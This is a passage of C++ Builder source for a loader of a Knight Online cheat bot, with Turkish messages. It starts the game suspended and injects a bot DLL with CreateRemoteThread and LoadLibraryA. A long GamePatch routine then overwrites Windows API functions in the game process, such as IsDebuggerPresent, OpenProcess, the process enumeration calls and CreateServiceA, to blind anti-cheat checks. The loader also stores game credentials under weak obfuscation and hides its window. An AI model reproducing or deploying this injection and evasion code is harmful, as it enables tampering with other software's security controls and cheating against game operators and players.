//---------------------------------------------------------------------------

#include <vcl.h>
#include <string>
#pragma hdrstop


#include "_frmLoader.h"
#include <windows.h>
#include <fstream>
#include <iostream>
#include <stdio.h>
#include "kaynak.hpp"
#include "Tlhelp32.h"

//---------------------------------------------------------------------------
#pragma package(smart_init)
#pragma resource "*.dfm"
TfrmLoader *frmLoader;

char* DLLNAME 		=	"kolebot.dll";
char* strWebAddress	=	"http://kolebot.com/loader_index.htm";
String HsServerlar[3] = {"208.94.241.66","213.229.102.70","94.76.208.12"};
char* strKODIR = NULL;
char strKOWND[25];
long lLastTick = 0;

DWORD dwDebugAPI = 0;

bool bCheckDebugEntry = true;
STARTUPINFO si;
PROCESS_INFORMATION pi;
//---------------------------------------------------------------------------
__fastcall TfrmLoader::TfrmLoader(TComponent* Owner)
	: TForm(Owner)
{
}
//---------------------------------------------------------------------------

DLLInject( String DllName)
 {

BYTE *Paramaters=NULL;                   //00797640
HANDLE Thread=NULL;
DWORD    ThreadId;
DWORD bytes=NULL;
DWORD   ExitCodeAdres=NULL;
//DWORD  ExitKOAdres=0x007E4144;//1474 0x007E3138;
WORD PrmNop=0xE990;
BYTE Dallan=0xEB;
unsigned char ExitCode[12] = {
	0x55, 0x8B, 0xEC, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x5D, 0xC2, 0x08, 0x00
};
     //006E4270       //prm
	// 0F 8C 19 01 00 00
	// 90 E9 19 01 00 00
// String path= ExtractFilePath(Application->ExeName);
 unsigned char DLL[MAX_PATH];
 String path=DllName;
 strcpy(DLL,path.c_str());
 Paramaters  =(BYTE *) VirtualAllocEx(pi.hProcess, NULL,1024, MEM_COMMIT, PAGE_READWRITE);
			  WriteProcessMemory(pi.hProcess, Paramaters, DLL, sizeof(DLL), &bytes);
			  ExitCodeAdres=(DWORD)Paramaters;
			  ExitCodeAdres+=500;
            // WriteProcessMemory(pi.hProcess,(void*)ExitCodeAdres , ExitCode, sizeof(ExitCode), &bytes);
			 // WriteProcessMemory(pi.hProcess,(void*)0x006E4270 ,&PrmNop,2, &bytes);
           //   WriteProcessMemory(pi.hProcess,(void*)ExitKOAdres , &ExitCodeAdres, 4, &bytes);
          //    WriteProcessMemory(pi.hProcess,(void*)0x006E416D ,&Dallan,1, &bytes);
		  //	WriteProcessMemory(pi.hProcess,(void*)0x006E420A ,&PrmNop,2, &bytes);

			Thread = CreateRemoteThread(pi.hProcess,0, 0, (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle("KERNEL32.DLL"), "LoadLibraryA"), (LPVOID)Paramaters, 0, &ThreadId);
			WaitForSingleObject(Thread, INFINITE);
			VirtualFreeEx(pi.hProcess, Paramaters, 0, MEM_RELEASE);

			CloseHandle(Thread);
}


 bool DllRunLancur(String KoPathNe,String DllBotName,bool multi)
{

char buf[MAX_PATH] ;

//GetModuleFileName(hInst,buf,MAX_PATH);
String DllPath= ExtractFilePath(Application->ExeName);
//ShowMessage(DllPath);
ZeroMemory(&si,sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&pi,sizeof(pi));
 String KoPath=KoPathNe;
  String FileName=KoPath+"\\KnightOnLine.exe"  ;
 // ShowMessage(FileName);
 String Calis;
 Calis.SetLength(1024);
 memset(Calis.c_str(),0,1024);

Calis ="\""+FileName+"\" E03ED890-8E94-4B42-B1C5-3CDA401AA9C2";//+IntToStr(GetCurrentProcessId());
// ShowMessage(Calis);
 //ShowMessage(FileName);
/*if (multi) {

 String NewExeName = KoPath + "\\swixdorf.swx";
 CopyFileA(FileName.c_str(),NewExeName.c_str(),0) ;
 Calis ="\""+NewExeName+"\" E03ED890-8E94-4B42-B1C5-3CDA401AA9C2";
 FileName = NewExeName;
}     */
PSECURITY_DESCRIPTOR pSD = NULL;


KoPath+="\\";

 CreateProcess(FileName.c_str(),Calis.c_str(),NULL ,NULL,0,CREATE_SUSPENDED,NULL,KoPath.c_str(),&si,&pi);

 DllPath=DllPath+DllBotName;//"hsdur.dll";//"loader.dll";

 DLLInject(DllPath);

 ResumeThread(pi.hThread);
 //ShowMessage("lancur yukle"+FileName);
 Sleep(1000);
 //TerminateProcess(pi.hProcess,0)  ;
}



void LoadProcess(bool multi){

	int iPathLen = frmLoader->txtPath->Text.Length();

	if(!iPathLen){
		frmLoader->dlgPath->FileName = "KnightOnline.exe";
		int	iTmpLen = frmLoader->dlgPath->FileName.Length();
		frmLoader->dlgPath->Execute(frmLoader->Handle);
		frmLoader->txtPath->Text = frmLoader->dlgPath->FileName;
		if(frmLoader->txtPath->Text.Length() == iTmpLen)
			frmLoader->txtPath->Text = "";
	}

	iPathLen = frmLoader->txtPath->Text.Length();
	if(!iPathLen){
		MessageBox(frmLoader->Handle,"KnightOnline bulunamadi!","Hata",MB_ICONSTOP);
		return;
	}

   //	CheckDLL();

	DeleteFileA("..//kopath.ini");

	ofstream fSave;
	fSave.open("..//kopath.ini",std::ios_base::out | std::ios_base::app);
	if(fSave.is_open() == true){
		fSave << frmLoader->txtPath->Text.c_str()<< "\n";
		fSave.close();
	}

	char *strPath = new char[iPathLen + 1];
	memset(strPath,0,iPathLen + 1);
	strcpy(strPath,frmLoader->txtPath->Text.c_str());

	char* pFileName = strrchr(strPath,'\\');
	if(!pFileName){
		MessageBox(frmLoader->Handle,"Hatali Path!","Hata",MB_ICONEXCLAMATION);
		delete []strPath;
		return;
	}

	ClearLogFiles();

	int iFileName = strlen(pFileName + 1);
	char *strFileName = new char[iFileName + 1];
	memset(strFileName,0,iFileName + 1);
	strcpy(strFileName,pFileName + 1);

	int iPathDir = strlen(strPath) - (iFileName + 1);
	char *strPathDir = new char[iPathDir + 1];
	memset(strPathDir,0,iPathDir + 1);
	memcpy(strPathDir,strPath,iPathDir);



	*(pFileName + 1) = '\0';
	strcat(strPath,"loginstatus.kole");
	DeleteFileA(strPath);

	*(pFileName + 1) = '\0';
	strcat(strPath,"autologin.kole");
	DeleteFileA(strPath);

	if(frmLoader->chotologin->Checked)
	{
		ofstream fSaveLogin;
		fSaveLogin.open(strPath,std::ios_base::out | std::ios_base::app);
		if(fSaveLogin.is_open() == true){

			fSaveLogin << "1\n";

			bool bTrial = false;
			if(frmLoader->chtrial->Checked)
			{
				fSaveLogin << "1\n";
				bTrial = true;
			}
			else
				fSaveLogin << "0\n";

			char pStr[32];

			memset(pStr,0,32);
			strcpy(pStr,frmLoader->txtgameid->Text.c_str());
			StrEncrypt(pStr,0);
			fSaveLogin << pStr << "\n";

			memset(pStr,0,32);
			strcpy(pStr,frmLoader->txtgamepw->Text.c_str());
			StrEncrypt(pStr,0);
			fSaveLogin << pStr << "\n";

			if(bTrial)
			{
				fSaveLogin << "-\n";
				fSaveLogin << "-\n";
			}
			else
			{
				memset(pStr,0,32);
				strcpy(pStr,frmLoader->txtbotid->Text.c_str());
				StrEncrypt(pStr,0);
				fSaveLogin << pStr << "\n";

				memset(pStr,0,32);
				strcpy(pStr,frmLoader->txtbotpw->Text.c_str());
				StrEncrypt(pStr,0);
				fSaveLogin << pStr << "\n";
			}

			char tmp[4]; *(DWORD*)tmp = 0;
			itoa(frmLoader->comserverlist->ItemIndex,tmp,10);
			fSaveLogin << tmp << "\n";

			*(DWORD*)tmp = 0;
			itoa(frmLoader->comserverno->ItemIndex,tmp,10);
			fSaveLogin << tmp << "\n";

			if(frmLoader->opleft->Checked)
				fSaveLogin << "1\n";
			else if(frmLoader->opcenter->Checked)
				fSaveLogin << "0\n";
			else
				fSaveLogin << "2\n";

			fSaveLogin.close();
		}
	}

	//*(pFileName + 1) = '\0';
	//strcat(strPath,"kole.dll");
	//CopyFile("kmodule.dat",strPath,false);

	*(pFileName + 1) = '\0';
	strcat(strPath,"alarm.mp3");

	HANDLE hFile = CreateFileA(strPath,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
	if( hFile == INVALID_HANDLE_VALUE)
		CopyFile("alarm.mp3",strPath,false);
	else
		CloseHandle(hFile);

    	*(pFileName + 1) = '\0';
	strcat(strPath,"kopath.ini");
	CopyFile("..\\kopath.ini",strPath,false);

	ZeroMemory( &si, sizeof(si) );
	si.cb = sizeof(si);
	ZeroMemory( &pi, sizeof(pi) );

		char tmp[25];	memset(tmp,0,25);

		srand(GetTickCount());
		short sWnd =  rand() % 0xFFFF + 1;
		itoa(sWnd,tmp,10);

		strcat(tmp,".exe");

		char newexe [256]; memset(newexe,0,256);

		strcpy(newexe,strPathDir);
		strcat(newexe,"\\");
		strcat(newexe,tmp);
		strcat(newexe,"\\");


		DllRunLancur(String(strPathDir),"kmodule.dat",multi);



	BYTE test[1] = { 0x00 };
	while ( test[0] != 0x8b){
		ReadProcessMemory(pi.hProcess,(LPVOID)0x401000,test,1,0);
	}



	Sleep(100);

	while ( test[0] != 0x4B){
		ReadProcessMemory(pi.hProcess,(LPVOID)KO_WNDA,test,1,0);
	}

	char free[20]; memset(free,0,20);

	char tmp2[25];	memset(tmp2,0,25);

	if(!multi){
		srand(GetTickCount());
		short sWnd =  rand() % 0xFFFF + 1;
		itoa(sWnd,tmp,10);
	 //	WriteProcessMemory(pi.hProcess,(LPVOID)KO_WNDA,tmp,4,NULL);
		memset(strKOWND,0,25);
		memcpy(strKOWND,tmp,4);
	}
	else{
		memcpy(tmp,frmLoader->txtmanualwnd->Text.c_str(),frmLoader->txtmanualwnd->Text.Length());
		WriteProcessMemory(pi.hProcess,(LPVOID)KO_WNDA,tmp,20,NULL);
		memset(strKOWND,0,25);
		memcpy(strKOWND,tmp,20);
	}

	WaitForInputIdle(pi.hProcess,INFINITE);

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	lLastTick = GetTickCount();

	if(frmLoader->chotologin->Checked == false)
		Application->Terminate();
	else{
		strKODIR = new char[iPathDir + 1];
		memset(strKODIR,0,iPathDir + 1);
		strcpy(strKODIR,strPathDir);
		delete [] strPath;
		delete [] strFileName;
		delete [] strPathDir;
		frmLoader->tmautologin->Enabled = true;
		//frmLoader->Caption = "K A P A T M A Y I N!";
		MakeRandomCaption();
		//frmLoader->WindowState = wsMinimized;
		frmLoader->tray->BalloonHint = strKOWND;
		frmLoader->tray->Hint = strKOWND;
		ShowWindow(frmLoader->Handle,SW_HIDE);
		frmLoader->tray->Visible = true;
		frmLoader->tray->Animate = true;
		frmLoader->tray->ShowBalloonHint();
	}

}
 bool CheckPath(AnsiString sPath)
{
	DWORD dwAttr = GetFileAttributes(sPath.c_str());
	if (dwAttr == 0xffffffff) 
	{
		if (GetLastError() == ERROR_FILE_NOT_FOUND || GetLastError() == ERROR_PATH_NOT_FOUND) 
			return false;
		return false;
	}
	if (dwAttr & FILE_ATTRIBUTE_DIRECTORY) return true;
	return true;
}
int WINAPI CopyThread(AnsiString From,AnsiString To)
{


}
void __fastcall TfrmLoader::FormShow(TObject *Sender)
{

	MakeRandomCaption();

	/*
	fstream hFound;
	hFound.open("kolebot.dll",ios::in);
	if(!hFound.is_open()){
		MessageBox(this->Handle,"kolebot.dll bulunamadi!","hata",MB_ICONSTOP);
		Application->Terminate();
	}
	hFound.close();
	*/

//	CheckDebugger();
	//CheckDLL();

	ifstream fPath;
	fPath.open("..//kopath.ini");

	if(fPath.is_open() == true){
		char Buffer[256];	memset(Buffer,0,256);
		fPath.getline(Buffer,256);

		if(strlen(Buffer) > 0)
			frmLoader->txtPath->Text = Buffer;
		else
			frmLoader->txtPath->Text = "";
		fPath.close();
	}
	else
		frmLoader->txtPath->Text = "";

	ifstream fLogin;
	fLogin.open("..//loader.cfg");

	if(fLogin.is_open() == true)
	{
		char STRBuffer[32]; memset(STRBuffer,0,32);
		char INTBuffer[4]; *(DWORD*)INTBuffer = 0;
		fLogin.getline(INTBuffer,4);

		chotologin->Checked = (bool)atoi(INTBuffer);

		fLogin.getline(STRBuffer,32);
		StrDecrypt(STRBuffer);
		txtgameid->Text = STRBuffer;

		memset(STRBuffer,0,32);

		fLogin.getline(STRBuffer,32);
		StrDecrypt(STRBuffer);
		txtgamepw->Text = STRBuffer;

		memset(STRBuffer,0,32);

		fLogin.getline(STRBuffer,32);
		StrDecrypt(STRBuffer);
		txtbotid->Text = STRBuffer;

		memset(STRBuffer,0,32);

		fLogin.getline(STRBuffer,32);
		StrDecrypt(STRBuffer);
		txtbotpw->Text = STRBuffer;

		fLogin.getline(INTBuffer,4);
		if( atoi(INTBuffer) == 0 )
			opleft->Checked = true;
		else if( atoi(INTBuffer) == 2 )
			opright->Checked = true;

		fLogin.getline(INTBuffer,4);
		comserverlist->ItemIndex = atoi(INTBuffer);

		fLogin.getline(INTBuffer,4);
		comserverno->ItemIndex = atoi(INTBuffer);

		fLogin.close();
    }

	webMain->Navigate(strWebAddress);
	WebBrowser2->Silent=true;
		WebBrowser3->Silent=true;
			WebBrowser4->Silent=true;
   //	WebBrowser2->Navigate("www.film-izle.com");
	WebBrowser4->Navigate("http://gamecrea.com");
	WebBrowser3->Navigate("http://onlinehile.org");
}
//---------------------------------------------------------------------------

void __fastcall TfrmLoader::btnLoad2Click(TObject *Sender)
{
ShowMessage("Bu Secenek ile sadece 1 adet Ko acabilirsiniz daha fazla ko icin multi yukle kullanin");
	LoadProcess(0);
}
//---------------------------------------------------------------------------


void __fastcall TfrmLoader::tmautologinTimer(TObject *Sender)
{
	if(strKODIR == NULL)
		return;

	static int iInterval = 0;
	iInterval++;

	HANDLE hMutex;
	char strPid[8];
	memset(strPid,0,8);
	DWORD dwRead(0);

	if(iInterval == 5)
	{
		MakeRandomCaption();
		iInterval = 0;
		if(IsWindowVisible(this->Handle) == true)
		{
			frmLoader->tray->BalloonHint = strKOWND;
			frmLoader->tray->Hint = strKOWND;
			ShowWindow(this->Handle,SW_HIDE);
			tray->Visible = true;
			tray->Animate = true;
			tray->ShowBalloonHint();
		}
	}

	char strCheckFile[256];	memset(strCheckFile,0,256);

	strcpy(strCheckFile,strKODIR);
	strcat(strCheckFile,"\\loginstatus.kole");

	if( GetTickCount() - lLastTick >= 5000)
	{
		if( FindWindowA(0,strKOWND) == NULL )
		{
			hMutex = CreateFileA("C:\\loginmutex.kole",GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
			if((long)hMutex != -1)
			{
				ReadFile(hMutex,strPid,5,&dwRead,0);
				CloseHandle(hMutex);
				if( atoi(strPid) != GetCurrentProcessId() )
					return;
			}
			else
			{
				//DeleteFileA("C:\\loginmutex.kole");

				ofstream fMutex;
				fMutex.open("C:\\loginmutex.kole",std::ios_base::out | std::ios_base::app);
				if(fMutex.is_open())
				{
					memset(strPid,0,8);
					itoa(GetCurrentProcessId(),strPid,10);
					fMutex << strPid;
				}
            }


			DeleteFileA(strCheckFile);
			tmautologin->Enabled = false;
			LoadProcess(1);
			return;
		}
	}

	ifstream fCheck;
	fCheck.open(strCheckFile);

	if(fCheck.is_open() == false)
		return;

	char tmp[4];	*(DWORD*)tmp = 0;
	fCheck.getline(tmp,4);
	bool bRet = (bool)atoi(tmp);

	fCheck.close();

	if(bRet == true)
	{
		DeleteFileA(strCheckFile);
		tmautologin->Enabled = false;
		LoadProcess(1);
	}
}
//---------------------------------------------------------------------------

void StrEncrypt(char* pStr, BYTE bUseKey)
{
	BYTE bKey = bUseKey;

	if(bKey == 0)
	{
		bKey = (BYTE)GetTickCount();

		while(bKey < 25)
			bKey += 25;

		while(bKey > 100)
			bKey -= 25;
	}

	int iLen = strlen(pStr);

	memmove(LPVOID(pStr + 1),pStr,iLen);

	*pStr = bKey;

	for (int i = 1; i <= iLen; i++) {
		*(pStr + i) += bKey;
		bKey--;
	}
}

void __fastcall TfrmLoader::chtrialClick(TObject *Sender)
{
	if(chtrial->Checked)
	{
		txtbotid->Text = "";
		txtbotpw->Text = "";
	}
}
//---------------------------------------------------------------------------

void GamePatch(HANDLE hProcess)
{

	if( !hProcess || (int)hProcess == -1)
		return;

	LoadLibrary("psapi.dll");

	HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");

	BYTE Patch1[] = {0x8B,0xFF,0xC2,0x08,0x00};
	DWORD tmpFuncAddr = (DWORD)GetProcAddress(hKernel32,"SetThreadAffinityMask");
	WriteProcessMemory(hProcess,(LPVOID)tmpFuncAddr,Patch1,sizeof(Patch1),0);

	BYTE Patch2[] = {0x64,0xA1,0x18,0x00,0x00,0x00,0x33,0xC0,0xC3};
	tmpFuncAddr = (DWORD)GetProcAddress(hKernel32,"IsDebuggerPresent");
	WriteProcessMemory(hProcess,(LPVOID)tmpFuncAddr,Patch2,sizeof(Patch2),0);

	BYTE Patch3[] = {0x8B,0xFF,0x33,0xC0,0xC2,0x08,0x00};
	tmpFuncAddr = (DWORD)GetProcAddress(hKernel32,"Process32First");
	WriteProcessMemory(hProcess,(LPVOID)tmpFuncAddr,Patch3,sizeof(Patch3),0);

	BYTE Patch4[] = {0x8B,0xFF,0x33,0xC0,0xC2,0x08,0x00};
	tmpFuncAddr = (DWORD)GetProcAddress(hKernel32,"Process32Next");
	WriteProcessMemory(hProcess,(LPVOID)tmpFuncAddr,Patch4,sizeof(Patch4),0);

	BYTE Patch5[] = {0x8B,0xFF,0x33,0xC0,0xC2,0x08,0x00};
	tmpFuncAddr = (DWORD)GetProcAddress(hKernel32,"CreateToolhelp32Snapshot");
	WriteProcessMemory(hProcess,(LPVOID)tmpFuncAddr,Patch5,sizeof(Patch5),0);

	BYTE Patch6[] = {0x8B,0xFF,0x33,0xC0,0xC2,0x14,0x00};
	tmpFuncAddr = (DWORD)GetProcAddress(hKernel32,"Toolhelp32ReadProcessMemory");
	WriteProcessMemory(hProcess,(LPVOID)tmpFuncAddr,Patch6,sizeof(Patch6),0);

	BYTE Patch7[] = {0x8B,0xFF,0x33,0xC0,0xC2,0x0C,0x00};
	tmpFuncAddr = (DWORD)GetProcAddress(hKernel32,"OpenProcess");
	WriteProcessMemory(hProcess,(LPVOID)tmpFuncAddr,Patch7,sizeof(Patch7),0);

	//BYTE Patch8[] = {0x8B,0xFF,0x33,0xC0,0xC2,0x14,0x00};
	//tmpFuncAddr = (DWORD)GetProcAddress(GetModuleHandleA("advapi32.dll"),"RegOpenKeyExA");
	//WriteProcessMemory(hProcess,(LPVOID)tmpFuncAddr,Patch8,sizeof(Patch8));

	BYTE Patch9[] = {0x8B,0xFF,0xB8,0x01,0x00,0x00,0x00,0xC2,0x08,0x00};
	tmpFuncAddr = (DWORD)GetProcAddress(GetModuleHandleA("user32.dll"),"EnumWindows");
	WriteProcessMemory(hProcess,(LPVOID)tmpFuncAddr,Patch9,sizeof(Patch9),0);

	BYTE Patch10[] = {0x8B,0xFF,0x8B,0x44,0x24,0x0C,0xC7,0x00,0x00,0x00,0x00,0x00,0xB8,0x01,0x00,0x00,0x00,0xC2,0x0C,0x00};
	tmpFuncAddr = (DWORD)GetProcAddress(hKernel32,"EnumProcesses");
	if(!tmpFuncAddr)
		tmpFuncAddr = (DWORD)GetProcAddress(GetModuleHandleA("psapi.dll"),"EnumProcesses");
	if(tmpFuncAddr)
		WriteProcessMemory(hProcess,(LPVOID)tmpFuncAddr,Patch10,sizeof(Patch10),0);

	BYTE Patch11[] = {0x8B,0xFF,0xB8,0x01,0x00,0x00,0x00,0xC2,0x10,0x00};
	tmpFuncAddr = (DWORD)GetProcAddress(hKernel32,"EnumProcessModules");
	if(!tmpFuncAddr)
		tmpFuncAddr = (DWORD)GetProcAddress(GetModuleHandleA("psapi.dll"),"EnumProcessModules");
	if(tmpFuncAddr)
		WriteProcessMemory(hProcess,(LPVOID)tmpFuncAddr,Patch11,sizeof(Patch11),0);

	BYTE Patch12[] = {0x8B,0xFF,0xB8,0x01,0x00,0x00,0x00,0xC2,0x14,0x00};
	tmpFuncAddr = (DWORD)GetProcAddress(hKernel32,"ReadProcessMemory");
	WriteProcessMemory(hProcess,(LPVOID)tmpFuncAddr,Patch12,sizeof(Patch12),0);

	BYTE Patch13[] = {0x8B,0xFF,0x8B,0x44,0x24,0x0C,0xC6,0x00,0x00,0x33,0xC0,0xC2,0x10,0x00};
	tmpFuncAddr = (DWORD)GetProcAddress(hKernel32,"GetModuleFileNameExA");
	if(!tmpFuncAddr)
		tmpFuncAddr = (DWORD)GetProcAddress(GetModuleHandleA("psapi.dll"),"GetModuleFileNameExA");
	if(tmpFuncAddr)
		WriteProcessMemory(hProcess,(LPVOID)tmpFuncAddr,Patch13,sizeof(Patch13),0);

	/*
	BYTE Patch14[] = {0x8B,0xFF,0x68,0,0,0,0,0xC3,0x90};
	LPVOID lpTestMem = VirtualAllocEx(hProcess, NULL, 128, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	BYTE FuncPatch[] = {0x55,0x8B,0xEC,0x56,0xFF,0x75,0x10,0x68,0,0,0,0,0xC3};
	tmpFuncAddr = (DWORD)GetProcAddress(hKernel32,"GetModuleHandleExA");
	*(DWORD*)(FuncPatch + 8) = tmpFuncAddr + 9;
	WriteProcessMemory(hProcess,lpTestMem,FuncPatch,sizeof(FuncPatch),0);
	*(DWORD*)(Patch14 + 3) = (DWORD)lpTestMem;
	WriteProcessMemory(hProcess,(LPVOID)tmpFuncAddr,Patch14,sizeof(Patch14),0);
	*/

	BYTE Patch15[] = {0x6A,0x14,0x83,0xC4,0x04,0x8B,0x44,0x24,0x08,0xC6,0x00,0x00,0x33,0xC0,0xC2,0x0C,0x00};
	tmpFuncAddr = (DWORD)GetProcAddress(GetModuleHandleA("user32.dll"),"GetClassNameA");
	WriteProcessMemory(hProcess,(LPVOID)tmpFuncAddr,Patch15,sizeof(Patch15),0);

	BYTE Patch16[] = {0x8B,0xFF,0x33,0xC0,0xC2,0x08,0x00};
	tmpFuncAddr = (DWORD)GetProcAddress(hKernel32,"Module32First");
	WriteProcessMemory(hProcess,(LPVOID)tmpFuncAddr,Patch16,sizeof(Patch16),0);

	BYTE Patch17[] = {0x8B,0xFF,0x33,0xC0,0xC2,0x08,0x00};
	tmpFuncAddr = (DWORD)GetProcAddress(hKernel32,"Module32Next");
	WriteProcessMemory(hProcess,(LPVOID)tmpFuncAddr,Patch17,sizeof(Patch17),0);

	BYTE Patch18[] = {0x8B,0xFF,0x33,0xC0,0xC2,0x08,0x00};
	tmpFuncAddr = (DWORD)GetProcAddress(GetModuleHandleA("user32.dll"),"GetWindow");
	WriteProcessMemory(hProcess,(LPVOID)tmpFuncAddr,Patch18,sizeof(Patch18),0);

	BYTE Patch19[] = {0xB8,0x01,0x00,0x00,0x00,0xC2,0x14,0x00};
	tmpFuncAddr = (DWORD)GetProcAddress(GetModuleHandleA("ntdll.dll"),"ZwReadVirtualMemory");
	WriteProcessMemory(hProcess,(LPVOID)tmpFuncAddr,Patch19,sizeof(Patch19),0);

	//BYTE Patch20[] = {0x8B,0x44,0x24,0x08,0x33,0xD2,0x42,0x89,0x10,0x8B,0xC2,0xC2,0x10,0x00};
	//tmpFuncAddr = (DWORD)GetProcAddress(GetModuleHandleA("ntdll.dll"),"ZwQuerySystemInformation");
	//WriteProcessMemory(hProcess,(LPVOID)tmpFuncAddr,Patch20,sizeof(Patch20),0);

//	BYTE Patch21[] = {0xB8,0x01,0x00,0x00,0x00,0xC2,0x18,0x00};
//	tmpFuncAddr = (DWORD)GetProcAddress(GetModuleHandleA("ntdll.dll"),"ZwQueryVirtualMemory");
//	WriteProcessMemory(hProcess,(LPVOID)tmpFuncAddr,Patch21,sizeof(Patch21),0);

	BYTE Patch22[] = {0xB8,0x01,0x00,0x00,0x00,0xC2,0x10,0x00};
	tmpFuncAddr = (DWORD)GetProcAddress(GetModuleHandleA("ntdll.dll"),"ZwOpenProcess");
	WriteProcessMemory(hProcess,(LPVOID)tmpFuncAddr,Patch22,sizeof(Patch22),0);

	//BYTE Patch23[] = {0xB8,0xFF,0xFF,0xFF,0xFF,0xC2,0x14,0x00};
	//tmpFuncAddr = (DWORD)GetProcAddress(GetModuleHandleA("ntdll.dll"),"ZwQueryInformationProcess");
	//WriteProcessMemory(hProcess,(LPVOID)tmpFuncAddr,Patch23,sizeof(Patch23),0);

	//BYTE Patch24[] = {};
	//tmpFuncAddr = (DWORD)GetProcAddress(GetModuleHandleA("ntdll.dll"),"RtlGetNativeSystemInformation");
	//WriteProcessMemory(hProcess,(LPVOID)tmpFuncAddr,Patch24,sizeof(Patch24),0);

	//BYTE Patch25[] = {0x8B,0xFF,0x8B,0x44,0x24,0x08,0xC7,0x00,0x00,0x00,0x00,0x00,0x8B,0x44,0x24,0x04,0xC2,0x08,0x00};
	//tmpFuncAddr = (DWORD)GetProcAddress(GetModuleHandleA("user32.dll"),"GetWindowThreadProcessId");
	//WriteProcessMemory(hProcess,(LPVOID)tmpFuncAddr,Patch25,sizeof(Patch25),0);

	BYTE Patch26[] = {0x8B,0xFF,0x8B,0x44,0x24,0x0C,0xC6,0x00,0x00,0x33,0xC0,0xC2,0x10,0x00};
	tmpFuncAddr = (DWORD)GetProcAddress(hKernel32,"GetModuleBaseNameA");
	if(!tmpFuncAddr)
		tmpFuncAddr = (DWORD)GetProcAddress(GetModuleHandleA("psapi.dll"),"GetModuleBaseNameA");
	if(tmpFuncAddr)
		WriteProcessMemory(hProcess,(LPVOID)tmpFuncAddr,Patch26,sizeof(Patch26),0);

	BYTE Patch27[] = {0x6A,0x68,0x83,0xC4,0x04,0x33,0xC0,0xC2,0x10,0x00};
	tmpFuncAddr = (DWORD)GetProcAddress(hKernel32,"GetModuleInformation");
	if(!tmpFuncAddr)
		tmpFuncAddr = (DWORD)GetProcAddress(GetModuleHandleA("psapi.dll"),"GetModuleInformation");
	if(tmpFuncAddr)
		WriteProcessMemory(hProcess,(LPVOID)tmpFuncAddr,Patch27,sizeof(Patch27),0);

	BYTE Patch28[] = {0x6A,0x30,0x58,0xB8,0,0,0,0,0x68,0x31,0x04,0x00,0x00,0xFF,0xD0,0x33,0xC0,0xC2,0x34,0x00};
	tmpFuncAddr = (DWORD)GetProcAddress(GetModuleHandleA("kernel32.dll"),"SetLastError");
	*(DWORD*)(Patch28 + 4) = tmpFuncAddr;
	tmpFuncAddr = (DWORD)GetProcAddress(GetModuleHandleA("advapi32.dll"),"CreateServiceA");
	WriteProcessMemory(hProcess,(LPVOID)tmpFuncAddr,Patch28,sizeof(Patch28),0);

	BYTE Patch29[] = {0x6A,0x14,0x58,0xB8,0,0,0,0,0x6A,0x78,0xFF,0xD0,0x33,0xC0,0xC2,0x0C,0x00};
	tmpFuncAddr = (DWORD)GetProcAddress(GetModuleHandleA("kernel32.dll"),"SetLastError");
	*(DWORD*)(Patch29 + 4) = tmpFuncAddr;
	tmpFuncAddr = (DWORD)GetProcAddress(GetModuleHandleA("advapi32.dll"),"OpenSCManagerA");
	WriteProcessMemory(hProcess,(LPVOID)tmpFuncAddr,Patch29,sizeof(Patch29),0);

	BYTE Patch30[] = {0x8B,0xFF,0xB8,0x01,0x00,0x00,0x00,0xC2,0x0C,0x00};
	tmpFuncAddr = (DWORD)GetProcAddress(GetModuleHandleA("user32.dll"),"EnumChildWindows");
	WriteProcessMemory(hProcess,(LPVOID)tmpFuncAddr,Patch30,sizeof(Patch30),0);

	BYTE Patch31[] = {0x8B,0xFF,0x33,0xC0,0xC2,0x0C,0x00};
	tmpFuncAddr = (DWORD)GetProcAddress(GetModuleHandleA("user32.dll"),"EnumThreadWindows");
	WriteProcessMemory(hProcess,(LPVOID)tmpFuncAddr,Patch31,sizeof(Patch31),0);

	BYTE Patch32[] = {0x8B,0xFF,0x8B,0x44,0x24,0x08,0xC7,0x00,0x00,0x00,0x00,0x00,0xB8,0x01,0x00,0x00,0x00,0xC2,0x08,0x00};
	tmpFuncAddr = (DWORD)GetProcAddress(hKernel32,"CheckRemoteDebuggerPresent");
	WriteProcessMemory(hProcess,(LPVOID)tmpFuncAddr,Patch32,sizeof(Patch32),0);

	BYTE Patch33[] = {0x6A,0x10,0x58,0xB8,0,0,0,0,0x68,0xFB,0x04,0x00,0x00,0xFF,0xD0,0x33,0xC0,0xC2,0x0C,0x00};
	tmpFuncAddr = (DWORD)GetProcAddress(GetModuleHandleA("kernel32.dll"),"SetLastError");
	*(DWORD*)(Patch33 + 4) = tmpFuncAddr;
	tmpFuncAddr = (DWORD)GetProcAddress(GetModuleHandleA("advapi32.dll"),"StartServiceA");
	WriteProcessMemory(hProcess,(LPVOID)tmpFuncAddr,Patch33,sizeof(Patch33),0);

	//BYTE Patch34[] = {0x8B,0xFF,0x33,0xC0,0xC2,0x14,0x00};
	//tmpFuncAddr = (DWORD)GetProcAddress(GetModuleHandleA("Wininet.dll"),"InternetOpenA");
	//WriteProcessMemory(hProcess,(LPVOID)tmpFuncAddr,Patch34,sizeof(Patch34),0);

	BYTE Patch35[] = {0x8B,0xFF,0xB8,0x01,0x00,0x00,0x00,0xC2,0x14,0x00};
	tmpFuncAddr = (DWORD)GetProcAddress(GetModuleHandleA("Wininet.dll"),"FtpPutFileA");
	WriteProcessMemory(hProcess,(LPVOID)tmpFuncAddr,Patch35,sizeof(Patch35),0);
}


void MakeRandomCaption()
{
	char Wnd[32]; memset(Wnd,0,32);

	srand(GetTickCount());
	BYTE bNumber;
	for (int i = 0; i < 10; i++) {
		bNumber = rand() % 0x5A + 1;
		while(bNumber < 0x41)
			bNumber += 10;

		*(Wnd + i) = bNumber;
	}

	char tmp[64]; memset(tmp,0,64);
	long lRandom = (short)GetTickCount();
	ltoa(lRandom,tmp,10);
	strcat(Wnd,tmp);
	frmLoader->Caption = Wnd;
}

void __fastcall TfrmLoader::btnsaveClick(TObject *Sender)
{
	char strGameID[32],strGamePW[32],strBotID[32],strBotPW[32];
	memset(strGameID,0,32);
	memset(strGamePW,0,32);
	memset(strBotID,0,32);
	memset(strBotPW,0,32);

	int iCharIndex = 1;
